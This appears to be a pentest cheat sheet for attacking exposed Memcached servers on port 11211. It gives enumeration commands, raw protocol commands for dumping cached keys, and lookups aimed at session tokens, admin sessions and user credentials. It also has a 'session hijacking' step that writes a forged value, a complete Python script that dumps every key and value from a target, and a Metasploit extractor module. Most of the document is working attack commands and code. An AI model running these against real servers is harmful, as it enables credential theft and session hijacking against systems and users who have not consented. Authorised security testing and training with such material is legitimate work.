# Port 11211 - Memcached

## Table of Contents

- [Enumeration](#enumeration)
- [Data Extraction](#data-extraction)
- [Exploitation](#exploitation)

---

## Enumeration

### Nmap

```shell
nmap -sV -sC -p 11211 $rhost
nmap -p 11211 --script memcached-info $rhost
```

### Banner Grabbing

```shell
echo "version" | nc -nv $rhost 11211
```

---

## Data Extraction

### Basic Commands

```shell
# Connect
nc -nv $rhost 11211

# Get version
version

# Get stats
stats

# List slabs
stats slabs

# List items in slabs
stats items

# Get cached keys (slab_id from stats items)
stats cachedump <slab_id> <num_items>
stats cachedump 1 100
```

### Get Stored Values

```shell
# Get value by key
get <key_name>

# Example
get username
get session
get password
```

### Using memcached-cli

```shell
# Install
pip install python-memcached

# Python script to dump
python3 -c "
import memcache
mc = memcache.Client(['$rhost:11211'])
# Get known key
print(mc.get('key_name'))
"
```

### Using memcdump

```shell
# Dump all keys
memcdump --servers=$rhost:11211

# Get values
memccat --servers=$rhost:11211 <key_name>
```

---

## Exploitation

### DDoS Amplification Attack

> Memcached can be abused for DDoS amplification (not for pentesting)

### Dump Sensitive Data

```shell
# Connect and enumerate
nc $rhost 11211

# Get stats to find slabs
stats items

# Dump keys from slabs (example: slab 1)
stats cachedump 1 1000

# Get interesting values
get session_token
get admin_session
get user_credentials
```

### Session Hijacking

```shell
# Find session keys
stats cachedump 1 100

# Get session data
get PHPSESSID_abc123
get session:user123

# Modify session (if writable)
set hijacked_session 0 900 10
admin_data
```

### Python Script for Full Dump

```python
#!/usr/bin/env python3
import socket
import re

def dump_memcached(host, port=11211):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Get slabs
    s.send(b"stats items\r\n")
    items = s.recv(4096).decode()
    
    # Parse slab IDs
    slabs = set(re.findall(r'items:(\d+):', items))
    
    for slab in slabs:
        # Get keys from each slab
        s.send(f"stats cachedump {slab} 100\r\n".encode())
        keys_data = s.recv(8192).decode()
        
        # Parse keys
        keys = re.findall(r'ITEM (\S+)', keys_data)
        
        for key in keys:
            s.send(f"get {key}\r\n".encode())
            value = s.recv(4096).decode()
            print(f"Key: {key}")
            print(f"Value: {value}\n")
    
    s.close()

if __name__ == "__main__":
    import sys
    dump_memcached(sys.argv[1])
```

---

## Metasploit

```shell
# Enumerate memcached
use auxiliary/gather/memcached_extractor
set RHOSTS $rhost
run
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `version` | Get version |
| `stats` | Get statistics |
| `stats items` | List items per slab |
| `stats cachedump <slab> <limit>` | Dump keys from slab |
| `get <key>` | Get value by key |
| `set <key> 0 <ttl> <size>` | Set value |
| `delete <key>` | Delete key |

| Tool | Command |
| :--- | :--- |
| Nmap | `nmap -p 11211 --script memcached-info $rhost` |
| memcdump | `memcdump --servers=$rhost:11211` |
| netcat | `echo "stats" \| nc $rhost 11211` |
